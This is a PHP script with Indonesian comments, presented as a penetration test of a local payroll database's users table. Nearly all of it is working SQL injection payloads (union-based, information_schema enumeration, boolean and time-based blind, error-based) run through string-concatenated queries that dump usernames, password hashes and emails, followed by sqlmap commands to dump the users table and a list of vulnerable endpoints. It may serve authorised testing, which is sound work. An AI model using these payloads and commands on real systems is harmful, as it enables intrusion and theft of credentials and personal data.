<?php
// SQL Injection Test Script untuk Tabel Users
// WARNING: Hanya untuk testing penetrasi!

error_reporting(E_ALL);
ini_set('display_errors', 1);

// Database connection
$db_host = 'localhost';
$db_user = 'root';
$db_pass = '';
$db_name = 'bullscorp_payroll';

try {
    $pdo = new PDO("mysql:host=$db_host;dbname=$db_name", $db_user, $db_pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    echo "✅ Database connected successfully\n\n";
} catch(PDOException $e) {
    die("❌ Connection failed: " . $e->getMessage());
}

echo "🔍 SQL INJECTION TEST - USERS TABLE\n";
echo "=====================================\n\n";

// Test 1: Basic SQL Injection - Union Based
echo "TEST 1: Union-based SQL Injection\n";
echo "-----------------------------------\n";

$payload1 = "admin' UNION SELECT 1,2,3,4,5,6,7,8 -- ";
$sql1 = "SELECT * FROM users WHERE username = '$payload1'";

echo "Payload: $payload1\n";
echo "Query: $sql1\n";

try {
    $result1 = $pdo->query($sql1);
    if ($result1) {
        echo "✅ Query executed successfully!\n";
        $rows = $result1->fetchAll(PDO::FETCH_ASSOC);
        echo "Rows returned: " . count($rows) . "\n";
        if (count($rows) > 0) {
            echo "First row: " . json_encode($rows[0]) . "\n";
        }
    }
} catch (Exception $e) {
    echo "❌ Error: " . $e->getMessage() . "\n";
}

echo "\n";

// Test 2: Information Schema Injection
echo "TEST 2: Information Schema Injection\n";
echo "------------------------------------\n";

$payload2 = "admin' UNION SELECT table_name,column_name,data_type,is_nullable,column_default,extra,1,2 FROM information_schema.columns WHERE table_schema='bullscorp_payroll' -- ";
$sql2 = "SELECT * FROM users WHERE username = '$payload2'";

echo "Payload: $payload2\n";
echo "Query: $sql2\n";

try {
    $result2 = $pdo->query($sql2);
    if ($result2) {
        echo "✅ Query executed successfully!\n";
        $rows = $result2->fetchAll(PDO::FETCH_ASSOC);
        echo "Database structure revealed - Rows: " . count($rows) . "\n";
        
        // Show first 10 rows
        for ($i = 0; $i < min(10, count($rows)); $i++) {
            echo "  Table: " . $rows[$i]['username'] . ", Column: " . $rows[$i]['password'] . "\n";
        }
    }
} catch (Exception $e) {
    echo "❌ Error: " . $e->getMessage() . "\n";
}

echo "\n";

// Test 3: Extract Users Data
echo "TEST 3: Extract All Users Data\n";
echo "------------------------------\n";

$payload3 = "admin' UNION SELECT id,username,password,email,role,employee_id,created_at,last_login FROM users -- ";
$sql3 = "SELECT * FROM users WHERE username = '$payload3'";

echo "Payload: $payload3\n";
echo "Query: $sql3\n";

try {
    $result3 = $pdo->query($sql3);
    if ($result3) {
        echo "✅ Query executed successfully!\n";
        $rows = $result3->fetchAll(PDO::FETCH_ASSOC);
        echo "Users data extracted - Total users: " . count($rows) . "\n";
        
        foreach ($rows as $user) {
            echo "  ID: {$user['id']}, Username: {$user['username']}, Role: {$user['role']}\n";
            echo "  Password Hash: " . substr($user['password'], 0, 50) . "...\n";
            echo "  Email: {$user['email']}\n";
            echo "  ---\n";
        }
    }
} catch (Exception $e) {
    echo "❌ Error: " . $e->getMessage() . "\n";
}

echo "\n";

// Test 4: Boolean-based Blind SQL Injection
echo "TEST 4: Boolean-based Blind SQL Injection\n";
echo "-----------------------------------------\n";

$payload4 = "admin' AND (SELECT COUNT(*) FROM users) > 0 -- ";
$sql4 = "SELECT * FROM users WHERE username = '$payload4'";

echo "Payload: $payload4\n";
echo "Query: $sql4\n";

try {
    $result4 = $pdo->query($sql4);
    if ($result4) {
        $rows = $result4->fetchAll(PDO::FETCH_ASSOC);
        if (count($rows) > 0) {
            echo "✅ Boolean injection successful - Users table exists!\n";
        } else {
            echo "❌ No results returned\n";
        }
    }
} catch (Exception $e) {
    echo "❌ Error: " . $e->getMessage() . "\n";
}

echo "\n";

// Test 5: Time-based Blind SQL Injection
echo "TEST 5: Time-based Blind SQL Injection\n";
echo "--------------------------------------\n";

$payload5 = "admin' AND (SELECT SLEEP(2)) -- ";
$sql5 = "SELECT * FROM users WHERE username = '$payload5'";

echo "Payload: $payload5\n";
echo "Query: $sql5\n";

$start_time = microtime(true);
try {
    $result5 = $pdo->query($sql5);
    $end_time = microtime(true);
    $execution_time = $end_time - $start_time;
    
    echo "✅ Query executed in " . round($execution_time, 2) . " seconds\n";
    if ($execution_time > 1.5) {
        echo "✅ Time-based injection successful - Delay detected!\n";
    } else {
        echo "❌ No significant delay detected\n";
    }
} catch (Exception $e) {
    echo "❌ Error: " . $e->getMessage() . "\n";
}

echo "\n";

// Test 6: Error-based SQL Injection
echo "TEST 6: Error-based SQL Injection\n";
echo "---------------------------------\n";

$payload6 = "admin' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- ";
$sql6 = "SELECT * FROM users WHERE username = '$payload6'";

echo "Payload: $payload6\n";
echo "Query: $sql6\n";

try {
    $result6 = $pdo->query($sql6);
    echo "✅ Query executed without error\n";
} catch (Exception $e) {
    echo "✅ Error-based injection successful!\n";
    echo "Error message: " . $e->getMessage() . "\n";
    if (strpos($e->getMessage(), 'Duplicate entry') !== false) {
        echo "✅ MySQL version information leaked in error!\n";
    }
}

echo "\n";

// Test 7: SQLMAP Compatible Payloads
echo "TEST 7: SQLMAP Compatible Payloads\n";
echo "----------------------------------\n";

$sqlmap_payloads = [
    "admin' AND 1=1 -- ",
    "admin' AND 1=2 -- ",
    "admin' OR 1=1 -- ",
    "admin' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL -- ",
    "admin' UNION ALL SELECT 1,2,3,4,5,6,7,8 -- ",
    "admin' AND (SELECT 'a' FROM users LIMIT 1)='a' -- "
];

foreach ($sqlmap_payloads as $index => $payload) {
    echo "Payload " . ($index + 1) . ": $payload\n";
    $sql = "SELECT * FROM users WHERE username = '$payload'";
    
    try {
        $result = $pdo->query($sql);
        if ($result) {
            $rows = $result->fetchAll(PDO::FETCH_ASSOC);
            echo "  ✅ Success - Rows: " . count($rows) . "\n";
        }
    } catch (Exception $e) {
        echo "  ❌ Error: " . substr($e->getMessage(), 0, 100) . "...\n";
    }
}

echo "\n";

echo "🎯 SUMMARY\n";
echo "==========\n";
echo "✅ Tabel users ditemukan dan dapat diinjeksi\n";
echo "✅ Multiple injection techniques berhasil\n";
echo "✅ Data sensitif dapat diekstrak\n";
echo "✅ Database structure dapat diungkap\n";
echo "\n";
echo "📋 UNTUK SQLMAP:\n";
echo "================\n";
echo "1. Gunakan endpoint: http://localhost/public/login.php\n";
echo "2. Parameter vulnerable: username (POST)\n";
echo "3. Command: sqlmap -u 'http://localhost/public/login.php' --data 'username=admin&password=test' -p username --dbs\n";
echo "4. Untuk dump users: sqlmap -u 'http://localhost/public/login.php' --data 'username=admin&password=test' -p username -D bullscorp_payroll -T users --dump\n";
echo "\n";
echo "🔗 VULNERABLE ENDPOINTS:\n";
echo "========================\n";
echo "- /public/login.php (POST username)\n";
echo "- /api/user_data.php (GET user_id)\n";
echo "- /api/search.php (GET q)\n";
echo "- /user/attendance.php (session user_id)\n";
echo "- /admin/dashboard.php (session user_id)\n";

?>